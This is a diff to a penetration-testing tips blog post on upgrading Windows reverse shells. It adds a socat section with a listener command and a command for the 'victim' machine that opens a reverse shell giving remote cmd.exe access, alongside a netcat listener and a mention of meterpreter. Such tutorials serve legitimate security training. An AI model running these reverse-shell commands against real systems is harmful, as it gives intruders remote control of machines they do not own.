@@ -4,7 +4,7 @@ description: >-
 title: Upgrade a Windows reverse shell to a fully usable shell                    # Add title of the machine here
 date: 2021-05-01 08:00:00 -0600                           # Change the date to match completion date
 categories: [Tips & Tricks]                     # Categories
-tags: [hacking, redteam, tips-n-tricks, socat, expect, python, linux, macos]     # TAG names should always be lowercase; add relevant tags
+tags: [hacking, redteam, tips-n-tricks, windows, socat, meterpreter]     # TAG names should always be lowercase; add relevant tags
 show_image_post: true                                    # Change this to true
 #image: /assets/img/                # Add image here for post preview image
 ---
@@ -27,9 +27,27 @@ rlwrap nc -lvnp $port
 
 Start your netcat listener by first prefixing it with the `rlwrap` command, then specifying the port to listen on.  Your shell will automatically be a bit more stable than running netcat by itself.
 
+## socat 
+
+Another powerful tool that can be used to get functional shells, do port forwarding, and much more is [`socat`](http://www.dest-unreach.org/socat/).  (Windows version: [https://github.com/3ndG4me/socat](https://github.com/3ndG4me/socat))
+
+1. From your attack platform create a listener
+
+```bash
+socat TCP4-LISTEN:$port,fork STDOUT
+```
+
+2. Upload to or compile `socat.exe` on the Windows victim machine.
+
+3. On the Windows victim create the reverse shell back to your waiting listener.
+
+```bash
+socat.exe TCP4:$ip:$port EXEC:'cmd.exe',pipes
+```
+
 ## meterpreter
 
-The only other method of upgrading the functionality of a Windows reverse shell that I know is to create a reverse shell payload that calls a `meterpreter` interactive shell.  This shell interacts with the Metasploit Framework to provide additional functionality such as uploading and downloading files, attempting to elevate privileges to System, and more.
+Another method of upgrading the functionality of a Windows reverse shell that I know is to create a reverse shell payload that calls a `meterpreter` interactive shell.  This shell interacts with the Metasploit Framework to provide additional functionality such as uploading and downloading files, attempting to elevate privileges to System, and more.
 
 ## Other Examples
 
